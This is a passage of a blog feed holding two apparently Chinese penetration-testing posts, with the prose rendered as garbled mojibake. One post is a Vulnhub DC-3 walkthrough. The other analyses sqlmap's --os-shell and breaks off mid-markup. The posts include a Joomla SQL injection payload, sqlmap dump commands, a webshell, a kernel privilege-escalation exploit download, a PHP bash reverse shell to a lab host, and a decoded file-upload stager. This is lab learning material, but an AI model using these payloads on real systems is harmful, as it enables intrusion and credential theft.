    <entry>
      <title>Vulnhub--DC-3</title>
      <link href="/2023/07/Vulnhub-DC-3/"/>
      <url>/2023/07/Vulnhub-DC-3/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢ÉÂáÜÂ§á"><a href="#ÁéØÂ¢ÉÂáÜÂ§á" class="headerlink" title="ÁéØÂ¢ÉÂáÜÂ§á"></a>ÁéØÂ¢ÉÂáÜÂ§á</h2><p>‰∏ãËΩΩÂú∞ÂùÄÔºö<a href="http://www.five86.com/downloads/DC-3-2.zip">http://www.five86.com/downloads/DC-3-2.zip</a><br>ÈïúÂÉèÂú∞ÂùÄÔºö<a href="https://download.vulnhub.com/dc/DC-3-2.zip">https://download.vulnhub.com/dc/DC-3-2.zip</a><br>Âú®ÊâìÂºÄÁöÑÊó∂ÂÄôÂá∫‰∫Ü‰∏Ä‰∏™ÈóÆÈ¢òÔºåÂ¶Ç‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031340292.png" alt="image-20230703133956196"><br>Ëß£ÂÜ≥ÊñπÊ≥ïÔºöÂú®CD&#x2F;DVDÈ´òÁ∫ßËÆæÁΩÆÈáåÈù¢Êîπ‰∏∫Â¶Ç‰∏ãÂç≥ÂèØ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031340610.png" alt="image-20230703134012551"></p><h2 id="ÂºÄÂßãÊâìÈù∂"><a href="#ÂºÄÂßãÊâìÈù∂" class="headerlink" title="ÂºÄÂßãÊâìÈù∂"></a>ÂºÄÂßãÊâìÈù∂</h2><p>‰ªéDC-3ÂºÄÂßãÂè™Êúâ‰∏Ä‰∏™flagÔºåÂæóÊèêÊùÉÂà∞rootÊâçËÉΩÊãøÂà∞<br>Êâ´ÊèèÂ≠òÊ¥ªIPÔºåËÆ∞ÂæóÊîπ‰∏∫NATËøûÊé•<br><code>arp-scan -l</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031340977.png" alt="image-20230703134029937"><br>IP‰∏∫<strong>192.168.75.136</strong><br>Êé¢Êµã‰∏Ä‰∏ãÂ≠òÊ¥ªÁ´ØÂè£<br><code>nmap -A 192.168.75.136 </code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031340327.png"><br>Êâ´‰∏Ä‰∏ãÁõÆÂΩïÁúãÁúã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031341959.png" alt="image-20230703134126915"><br>Êúâ‰∏™ÂêéÂè∞ÔºåÂÖàÊîæÁùÄÔºåËÆøÈóÆ‰∏Ä‰∏ãIPÂà©Áî®Êèí‰ª∂ÂèëÁé∞CMS‰∏∫Joomla<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031341778.png" alt="image-20230703134155733"></p><h2 id="sqlÊ≥®ÂÖ•"><a href="#sqlÊ≥®ÂÖ•" class="headerlink" title="sqlÊ≥®ÂÖ•"></a>sqlÊ≥®ÂÖ•</h2><p>Áúã‰∏ãÊúâÊ≤°ÊúâÂéÜÂè≤ÊºèÊ¥ûÔºåÂèëÁé∞Â≠òÂú®sqlÊ≥®ÂÖ•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.75.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031342864.png" alt="image-20230703134218819"><br>ÁÑ∂ÂêéÁî®sqlmap‰∏ÄÊääÊ¢≠ÁúãÁúãÊúâ‰ªÄ‰πà‰∏úË•øÂêßÔºåÂ∞ÜÊï∞ÊçÆÂåÖ‰øùÂ≠òÂú®Ê≥®ÂÖ•ÁöÑÂèÇÊï∞Âä†‰∏™<code>*</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031342657.png" alt="image-20230703134236625"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r &quot;/home/joker27/Ê°åÈù¢/111.txt&quot; --dbs</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031342672.png" alt="image-20230703134249625"><br>Âà∞ËøôÈáåÂ∞±Ê≤°Âï•Âà©Áî®ÊÄùË∑Ø‰∫ÜÔºåË°®ÂÆûÂú®Â§™Â§ö‰∫ÜÔºåÊáíÂæó‰∏Ä‰∏™‰∏™ÁåúÔºåÁúãÁúãwpÂêßÔºåÂèëÁé∞Êúâ‰∏™‰∏ìÈó®ÈíàÂØπjoomlaÁöÑÂ∑•ÂÖ∑ÂÆâË£Ö‰∏Ä‰∏ã</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install joomscan</span><br></pre></td></tr></table></figure><p>ÂºÄÊâ´<code>joomscan -u http://192.168.75.136</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031343261.png" alt="image-20230703134305215"><br>ÁúãÂà∞‰∫ÜÁâàÊú¨‰∏∫3.7.0ÔºåËøô‰∏™ÁâàÊú¨ÊúâsqlÊ≥®ÂÖ•ÂâçÈù¢Â∑≤ÁªèÂà©Áî®Ëøá‰∫ÜÔºå‰ªéwpÂæóÁü•ÂØÜÁ†ÅÂú®<code>#__users</code>Ë°®‰∏≠ÔºåÊú¨Êù•ÊÉ≥ÈÄöËøáÊàëÂâçÈù¢ÁöÑÊ≥®ÂÖ•ÊñπÊ≥ïÁõ¥Êé•Êü•ÁúãÁöÑÔºå‰ΩÜÊòØÂèëÁé∞Ê≤°Ê≥ïÊü•ÁúãÊï∞ÊçÆ‰∫ÜÔºåÂè™ËÉΩÈÄöËøámsfÊù•Áúã‰∏Ä‰∏ã‰∫ÜÔºåÊ≤°ÊÄé‰πàÁî®ËøámsfÈÉΩ‰∏çÂ§™ÁÜüÁªÉ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit joomla 3.7.0</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031343141.png" alt="image-20230703134335109"><br>ÁúãwpËøôÈáå‰∏çËÉΩÁî®msfÁõ¥Êé•ÊâìÔºåÊâÄ‰ª•Â∞±Áõ¥Êé•ÁúãÁúãpayload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031343915.png" alt="image-20230703134346862"><br>Âõ†‰∏∫ÂâçÈù¢ÁöÑ‰∏úË•øÈÉΩÂ∑≤ÁªèÊ≥®Âá∫Êù•‰∫ÜÊâÄ‰ª•Áõ¥Êé•Ê≥®ÂàóÂêç</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &#x27;#__users&#x27; --columns -p list[fullordering]</span><br></pre></td></tr></table></figure><p>ÂæóÂà∞ÂàóÂêç<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031344803.png" alt="image-20230703134406761"><br>Êé•‰∏ãÊù•Êü•ÁúãÊï∞ÊçÆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomladb -T &#x27;#__users&#x27; -C name,password,username --dump -p list[fullordering]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031344583.png" alt="image-20230703134421547"><br>ÂØÜÁ†ÅÊòØÂä†ÂØÜÁöÑÁî®johnÁàÜÁ†¥‰∏Ä‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031345400.png" alt="image-20230703134432752"><br>ÂæóÂà∞ÂØÜÁ†ÅsnoopyÔºåÁôªÂΩï‰∏Ä‰∏ãÂêéÂè∞ÔºåÊàêÂäüÁôªÂΩï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031345190.png" alt="image-20230703134547119"></p><h2 id="Êãøshell"><a href="#Êãøshell" class="headerlink" title="Êãøshell"></a>Êãøshell</h2><p>Êé•‰∏ãÊù•ÊâæÊâæÊúâÊ≤°Êúâ‰∏ä‰º†ÁÇπÂï•ÁöÑÔºåÊúÄÁªàÂú®‰∏ãÈù¢ËøôÈáåÂèëÁé∞ÂèØ‰ª•Áõ¥Êé•ÁîüÊàêÊñá‰ª∂<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031346665.png" alt="image-20230703134607616"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031346305.png" alt="image-20230703134618256"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031346130.png" alt="image-20230703134633073"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031346542.png" alt="image-20230703134644502"><br>ÂÆ≥ÔºåÊâæË∑ØÂæÑÊâæ‰∫ÜÂçäÂ§©„ÄÇ„ÄÇ„ÄÇ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031346356.png" alt="image-20230703134658292"><br>ÊàëËøôÂè∞Êú∫Âô®Ê≤°Ë£ÖËöÅÂâëÊç¢‰∏™Â∑•ÂÖ∑ÔºåÂà©Áî®kaliËá™Â∏¶ÁöÑweevely</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely generate cmd shell.php //ÁîüÊàêshell</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031347730.png" alt="image-20230703134712673"><br>‰ΩÜÊòØÁõ¥Êé•‰∏ä‰º†Â§±Ë¥•‰º∞ËÆ°ÈôêÂà∂‰∫ÜÔºåÈÇ£‰πàÂ∞±Áõ¥Êé•Â∞Ü‰ª£Á†ÅÂ§çÂà∂Âà∞‰πãÂâçÁöÑÈÇ£‰∏™1.phpÈáåÈù¢<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031347122.png" alt="image-20230703134729073"><br>ËøûÊé•ÊàêÂäü</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely http://192.168.75.136/templates/bezz3/1.php cmd  //ËøûÊé•</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031348106.png" alt="image-20230703134812024"><br>‰ΩøÁî®ÂëΩ‰ª§<code>cat /etc/issue</code>Êü•ÁúãÁ≥ªÁªüÂèëË°åÁâàÊú¨‰ø°ÊÅØ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031351895.png" alt="image-20230703135102848"></p><h2 id="ÊãíÁªùÊúçÂä°ÊºèÊ¥ûÊèêÊùÉ-ÈÄöËøáweevelyËøõË°åÁªìÊûúÂ§±Ë¥•"><a href="#ÊãíÁªùÊúçÂä°ÊºèÊ¥ûÊèêÊùÉ-ÈÄöËøáweevelyËøõË°åÁªìÊûúÂ§±Ë¥•" class="headerlink" title="ÊãíÁªùÊúçÂä°ÊºèÊ¥ûÊèêÊùÉ (ÈÄöËøáweevelyËøõË°åÁªìÊûúÂ§±Ë¥•)"></a>ÊãíÁªùÊúçÂä°ÊºèÊ¥ûÊèêÊùÉ (ÈÄöËøáweevelyËøõË°åÁªìÊûúÂ§±Ë¥•)</h2><p>ÁÑ∂ÂêéÊú¨Âú∞ÂØªÊâæÁõ∏ÂÖ≥ÊèêÊùÉÊºèÊ¥û</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu 16.04</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031351957.png" alt="image-20230703135118863"><br>Êü•ÁúãËøô‰∏™ÊºèÊ¥û</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/linux/local/39772.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031351160.png" alt="image-20230703135132114"><br>‰ΩøÁî®wgetÂ∞Üexp‰∏ãËΩΩÂà∞Èù∂Êú∫<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031352767.png" alt="image-20230703135202692"><br>ÁúãwpÁöÑÊó∂ÂÄôÁâàÊú¨‰∏ç‰∏ÄÊ†∑ÁöÑËØùËøôÈáåÊúâËøôÈáåÈìæÊé•ÊúâÂèØËÉΩÂ§±ÊïàÔºåÊàëËøô‰∏™Â∫îËØ•ÂèØ‰ª•ÔºåÂ¶ÇÊûú‰∏ãËΩΩÂ§±Ë¥•ÂèØ‰ª•Êç¢‰∏™ÈìæÊé•ËØïËØï</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://gitee.com/aaaddc/exploitdb-bin-sploits/blob/master/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéËß£Âéã<code>unzip 39772.zip</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031353220.png" alt="image-20230703135310168"><br>ËøõÂÖ•39772ÁõÆÂΩïËß£Âéã<code>exploit.tar</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf exploit.tar</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031353416.png" alt="image-20230703135326366"><br>ËøõÂÖ•Ëß£ÂéãÂêéÁöÑÁõÆÂΩï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031353970.png" alt="image-20230703135340924"><br>ËøêË°å<code>compile.sh</code>ÁºñËØëÊñá‰ª∂<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031353998.png" alt="image-20230703135351940"><br>ÁÑ∂ÂêéÊâßË°å<code>./doubleput</code>ÊèêÊùÉ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031354358.png" alt="image-20230703135404296"><br>ËøôÈáåÊâßË°åÂ§±Ë¥•‰∫ÜÔºåÁúã‰∫ÜwpÊúâÁöÑ‰∫∫ËøôÈáå‰πüÂ§±Ë¥•‰∫Ü‰º∞ËÆ°Ëøô‰∏™weevely‰∏çÂ§™Ë°å</p><h2 id="ÊîæÂºÉweevelyÈÄöËøáÂèçÂºπshellËøõË°å"><a href="#ÊîæÂºÉweevelyÈÄöËøáÂèçÂºπshellËøõË°å" class="headerlink" title="ÊîæÂºÉweevelyÈÄöËøáÂèçÂºπshellËøõË°å"></a>ÊîæÂºÉweevelyÈÄöËøáÂèçÂºπshellËøõË°å</h2><p>Ê≤°ÂäûÊ≥ïÂè™ËÉΩÊç¢‰∏™ÊñπÂºè‰∫ÜÔºåÁõ¥Êé•ÂèçÂºπ‰∏™shellÂà∞kali‰∏äÂêß</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.75.128/6666 0&gt;&amp;1&#x27; &quot;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031354597.png" alt="image-20230703135415550"><br>ËÆøÈóÆÈ°µÈù¢ÊãøÂà∞shellÔºåÂõ†‰∏∫ÂâçÈù¢Êñá‰ª∂Â∑≤Áªè‰∏ä‰º†ÊâÄ‰ª•ËøôÈáåÁõ¥Êé•ÊâæÂà∞Êñá‰ª∂ÊâßË°åÂëΩ‰ª§Â∞±Ë°å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031354899.png" alt="image-20230703135438853"><br>ÊèêÊùÉÊàêÂäüÔºåÊãøÂà∞flag<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307031354139.png" alt="image-20230703135449069"></p>]]></content>
      
      
      <categories>
          
          <category> Ê∏óÈÄè </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Sqlmap --os-shellÂéüÁêÜÂàÜÊûê</title>
      <link href="/2023/06/Sqlmap-os-shell%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
      <url>/2023/06/Sqlmap-os-shell%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="ÊµãËØïÁéØÂ¢É"><a href="#ÊµãËØïÁéØÂ¢É" class="headerlink" title="ÊµãËØïÁéØÂ¢É"></a>ÊµãËØïÁéØÂ¢É</h2><p>ËøôÈáå‰ΩøÁî®ÁöÑÊòØÊú¨Âú∞Êê≠Âª∫ÁöÑsqllabÈù∂Âú∫ÔºåÊê≠Âª∫Ëøô‰∏™Èù∂Âú∫Â¶ÇÊûúÈÅáÂà∞Êï∞ÊçÆÂ∫ìÂä†ËΩΩ‰∏çÊàêÂäüÂ§ßÊ¶ÇÁéáÂéüÂõ†‰∏∫phpÁâàÊú¨ÈóÆÈ¢òÔºåphpÁâàÊú¨ÂøÖÈ°ª‰∏∫5.xÂõ†‰∏∫7‰ª•‰∏ä‰∏çÊîØÊåÅ<code>mysql_connect</code>ÂáΩÊï∞Áî®ÁöÑÊòØ<code>mysqli_connect</code></p><h2 id="ÂºÄÂßãÊ≥®ÂÖ•"><a href="#ÂºÄÂßãÊ≥®ÂÖ•" class="headerlink" title="ÂºÄÂßãÊ≥®ÂÖ•"></a>ÂºÄÂßãÊ≥®ÂÖ•</h2><p>ËøôÈáåÊàë‰∏ÄÂºÄÂßã<code>--os-shell</code>‰∏ÄÁõ¥ÂÜô‰∏çËøõÂéªÈ©¨ÔºåËøò‰ª•‰∏∫ÊòØÊàëË∑ØÂæÑÁöÑÈóÆÈ¢òÔºåÂêéÈù¢ÂèëÁé∞ÊòØ<code>secure_file_priv=</code>ÂøÖÈ°ª‰∏∫Á©∫Ëøô‰∏™Êù°‰ª∂‰∏çÊª°Ë∂≥ÔºåphpstudyÊï∞ÊçÆÂ∫ìÈáåÈù¢Ê≤°ÊúâËøô‰∏™ÂèÇÊï∞ÔºåÊâÄ‰ª•Âä†‰∏äÂ∞±Ë°å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162048382.png" alt="image-20230616204823343"><br>ÂºÄÂßãsqlÊ≥®ÂÖ•ÔºåÂÖàÊäìÂèñ‰∏Ä‰∏™Êï∞ÊçÆÂåÖÔºåÁÑ∂ÂêéÂÖ≥Èó≠Êã¶Êà™ÔºåÊâßË°å‰∏ãÈù¢ÂëΩ‰ª§ÔºåËøôÊ†∑ÂèØ‰ª•Âú®burp‰∏äÊäìÂèñÂà∞ÊâÄÊúâÁöÑÊï∞ÊçÆÂåÖ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.102/sqli-labs-master/Less-1/?id=1&quot; --os-shell --proxy=http://127.0.0.1:8080</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162048866.png" alt="image-20230616204835828"><br>ÂÖ∑‰ΩìÂèÇÊï∞ÈÄâÊã©Â¶Ç‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162048412.png" alt="image-20230616204846342"><br>ÊãøÂà∞shell</p><h2 id="ÂºÄÂßãÂàÜÊûê"><a href="#ÂºÄÂßãÂàÜÊûê" class="headerlink" title="ÂºÄÂßãÂàÜÊûê"></a>ÂºÄÂßãÂàÜÊûê</h2><p>Êàë‰ª¨‰ªé‰∏ãÈù¢Êï∞ÊçÆÂåÖÂºÄÂßãÂàÜÊûêÔºåÂâçÈù¢ÁöÑÈÉΩÊòØÊ≠£Â∏∏Ê≥®ÂÖ•ÁöÑËøáÁ®ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202306162048240.png" alt="image-20230616204857182"><br>ËøôÈáågetÊñπÂºè‰º†ÂÖ•‰∫Ü‰∏ÄÂ§ßÂ†ÜurlÁºñÁ†ÅÁöÑÊï∞ÊçÆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-8041%27%20OR%209362%3D9362%20LIMIT%200%2C1%20INTO%20OUTFILE%20%27D%3A%2Fphpstudy_pro%2FWWW%2Fsqli-labs-master%2FLess-1%2Ftmpuqmdh.php%27%20LINES%20TERMINATED%20BY%200x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d443a5c5c70687073747564795f70726f5c5c5757575c5c73716c692d6c6162732d6d61737465725c5c4c6573732d315c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a--%20-</span><br></pre></td></tr></table></figure><p>Ëß£Á†Å‰∏Ä‰∏ã</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-8041&#x27; OR 9362=9362 LIMIT 0,1 INTO OUTFILE &#x27;D:/phpstudy_pro/WWW/sqli-labs-master/Less-1/tmpuqmdh.php&#x27; LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d443a5c5c70687073747564795f70726f5c5c5757575c5c73716c692d6c6162732d6d61737465725c5c4c6573732d315c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- -</span><br></pre></td></tr></table></figure><p>ÂâçÈù¢‰∏ÄÊù°ÊòØÊ≠£Â∏∏ÁöÑsqlËØ≠Âè•ÔºåÂêéÈù¢ÊòØÂçÅÂÖ≠ËøõÂà∂Êï∞ÊçÆÔºåÊääËøô‰∏™ÂÜçËß£Á†Å‰∏Ä‰∏ã,Ëß£Âá∫Êù•ÊòØphp‰ª£Á†ÅÔºåÊï¥ÁêÜ‰∏Ä‰∏ã</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;upload&quot;</span>])) &#123;  </span><br><span class="line">    <span class="variable">$dir</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;uploadDir&quot;</span>];  </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">phpversion</span>() &lt; <span class="string">&#x27;4.1.0&#x27;</span>) &#123;  </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$HTTP_POST_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];  </span><br><span class="line">        @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$HTTP_POST_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$file</span>) <span class="keyword">or</span> <span class="keyword">die</span>();  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];  </span><br><span class="line">        @<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$file</span>) <span class="keyword">or</span> <span class="keyword">die</span>();  </span><br><span class="line">    &#125;  </span><br><span class="line">    @<span class="title function_ invoke__">chmod</span>(<span class="variable">$dir</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$file</span>, <span class="number">0755</span>);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File uploaded&quot;</span>;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;form action=&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>] . <span class="string">&quot; method=POST enctype=multipart/form-data&gt;&lt;input type=hidden name=MAX_FILE_SIZE value=1000000000&gt;&lt;b&gt;sqlmap file uploader&lt;/b&gt;&lt;br&gt;&lt;input name=file type=file&gt;&lt;br&gt;to directory: &lt;input type=text name=uploadDir value=D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-1\\&gt; &lt;input type=submit name=upload value=upload&gt;&lt;/form&gt;&quot;</span>;  </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ÂÖàÁúã‰∏Ä‰∏ãÂâçÈù¢ÁöÑsqlËØ≠Âè•Âê´‰πâ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;D:/phpstudy_pro/WWW/sqli-labs-master/Less-1/tmpuqmdh.php&#x27;</span> LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;Y0n3er&#x27;</span></span><br></pre></td></tr></table></figure><p>ËøôÊù°ËØ≠Âè•ÂÖ∂ÂÆûÂ∞±ÊòØÂú®ÊåáÂÆöË∑ØÂæÑ‰∏ãÂÜôÂÖ•Y0n3erÔºå<code>LINES TERMINATED BY</code>ÂèÇÊï∞Áî®‰∫éÊåáÂÆöÂ∞ÜÂºïÂè∑ÂÜÖÁöÑÂÜÖÂÆπ‰Ωú‰∏∫ÁªàÊ≠¢Á¨¶Ôºå‰ΩÜÊòØËøôÊ†∑ÂèØ‰ª•Â∞ÜÊåáÂÆöÁöÑÂÜÖÂÆπÂÜôÂÖ•Êñá‰ª∂‰∏≠ÔºåÂ¶Ç‰∏ã</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span 